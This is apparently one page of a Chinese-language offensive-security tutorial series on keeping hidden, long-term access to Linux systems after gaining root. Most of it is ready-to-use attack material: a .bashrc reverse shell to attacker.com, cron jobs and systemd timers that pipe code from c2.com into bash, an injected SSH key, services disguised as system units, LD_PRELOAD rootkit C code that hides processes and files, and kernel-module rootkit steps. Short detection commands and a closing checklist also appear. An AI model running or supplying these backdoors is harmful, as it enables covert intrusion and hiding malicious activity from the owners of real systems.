# Linux 持久化与权限维持

## 概述

获取 root 权限只是开始——真正的挑战是在不被发现的情况下长期维持访问。Linux 持久化方式极其多样，从传统的 cron 到内核级别的 rootkit。

---

## 1. 用户态持久化

### 1.1 Shell 配置文件

```bash
# 1. .bashrc 后门
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &' >> ~/.bashrc

# 2. .ssh/authorized_keys
echo "ssh-rsa AAAA... attacker@c2" >> ~/.ssh/authorized_keys

# 3. .ssh/rc (登录时执行)
echo '#!/bin/bash' > ~/.ssh/rc
echo 'nohup /tmp/.backdoor > /dev/null 2>&1 &' >> ~/.ssh/rc
chmod +x ~/.ssh/rc

# 4. .profile / .bash_profile
echo '/usr/share/man/.cache-update &' >> ~/.profile

# 检测: 检查所有用户的 rc/profile/bashrc 文件
find /home /root -name ".bashrc" -o -name ".profile" -o -name ".ssh/rc" | \
  xargs grep -l 'bash -i\|nc\|/dev/tcp'
```

### 1.2 Cron 持久化

```bash
# 1. crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://c2.com/b|bash") | crontab -

# 2. /etc/crontab（系统级 cron）
echo "*/10 * * * * root /usr/lib/systemd/systemd-update" >> /etc/crontab

# 3. cron.d
echo "*/10 * * * * root /tmp/.update" > /etc/cron.d/system-update

# 4. cron.daily / cron.hourly 等
echo '#!/bin/bash' > /etc/cron.hourly/logrotate.sh
echo '/usr/share/man/.cache-cleaner &' >> /etc/cron.hourly/logrotate.sh
chmod +x /etc/cron.hourly/logrotate.sh

# 检测: 审计所有 cron 任务
for d in /var/spool/cron /etc/cron*; do
    find $d -type f -exec grep -l 'curl\|wget\|nc\|bash -' {} \;
done
```

---

## 2. Systemd 服务持久化

### 2.1 恶意服务创建

```bash
# 创建伪装服务
cat > /etc/systemd/system/systemd-networkd-resolver.service << 'EOF'
[Unit]
Description=Network Name Resolution
After=network.target

[Service]
Type=simple
ExecStart=/usr/lib/systemd/systemd-resolved --update
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable systemd-networkd-resolver.service
systemctl start systemd-networkd-resolver.service

# 检测异常服务
systemctl list-units --state=running | grep -v "^$(systemctl list-unit-files --state=enabled | awk '{print $1}' | paste -sd '|')"
```

### 2.2 Timer 持久化

```bash
# systemd timer 比 cron 更隐蔽
cat > /etc/systemd/system/log-cleaner.service << 'EOF'
[Service]
ExecStart=/bin/bash -c 'curl -s http://c2.com/b|bash'
EOF

cat > /etc/systemd/system/log-cleaner.timer << 'EOF'
[Timer]
OnBootSec=5min
OnUnitActiveSec=30min

[Install]
WantedBy=timers.target
EOF

systemctl enable log-cleaner.timer
```

---

## 3. LD_PRELOAD Rootkit

```c
/*
 * LD_PRELOAD Rootkit
 * 编译: gcc -shared -fPIC -o /tmp/libc.so.6 rootkit.c
 * 注入: echo "/tmp/libc.so.6" > /etc/ld.so.preload
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

// 隐藏进程
struct dirent *readdir(DIR *dirp) {
    struct dirent *(*original_readdir)(DIR *);
    original_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *dir;
    while ((dir = original_readdir(dirp)) != NULL) {
        // 隐藏包含 "backdoor" 的进程
        if (strstr(dir->d_name, "backdoor") == NULL) break;
    }
    return dir;
}

// 隐藏文件
int stat(const char *path, struct stat *buf) {
    int (*original_stat)(const char *, struct stat *);
    original_stat = dlsym(RTLD_NEXT, "stat");

    // 隐藏包含 ".hide" 的文件/目录
    if (strstr(path, ".hide") != NULL) {
        errno = ENOENT;
        return -1;
    }
    return original_stat(path, buf);
}

// 使用示例:
// $ ls /tmp/.hide.backdoor → File not found (被 hook 隐藏)
```

---

## 4. 内核级持久化

```bash
# Linux Kernel Module (LKM) Rootkit
# 注意: 需要内核源代码

# 编译内核模块
cat > rootkit.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kprobes.h>

MODULE_LICENSE("GPL");

static int __init rootkit_init(void) {
    // Hook sys_kill → 接收信号触发 shell
    // Magic port knock: kill -64 31337
    printk(KERN_INFO "Rootkit loaded\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Rootkit removed\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
EOF

make -C /lib/modules/$(uname -r)/build M=$(pwd) modules

# 加载模块
insmod rootkit.ko
# 自动加载: echo "rootkit" >> /etc/modules-load.d/rootkit.conf
```

---

## 5. 检测清单

```bash
# Linux 持久化检测脚本

echo "=== 持久化检测 ==="

echo "[+] 异常 cron 任务:"
find /var/spool/cron /etc/cron* -type f -exec ls -la {} \; 2>/dev/null

echo "[+] 异常 systemd 服务:"
find /etc/systemd/system -name "*.service" -mtime -7 2>/dev/null

echo "[+] LD_PRELOAD:"
cat /etc/ld.so.preload 2>/dev/null

echo "[+] 异常 SSH 密钥:"
find /home /root -name "authorized_keys" -exec cat {} \; 2>/dev/null

echo "[+] SUID 二进制 (新增):"
find / -perm -4000 -mtime -7 2>/dev/null

echo "[+] 内核模块:"
lsmod | grep -v "^Module"

echo "[+] 隐藏进程 (ps vs /proc):"
ps aux > /tmp/ps.txt
ls /proc | grep -E '^[0-9]+$' > /tmp/proc.txt
diff <(awk '{print $2}' /tmp/ps.txt | sort -u) /tmp/proc.txt
```

---

*上一篇：[Linux 提权](02-linux-privesc.md)*
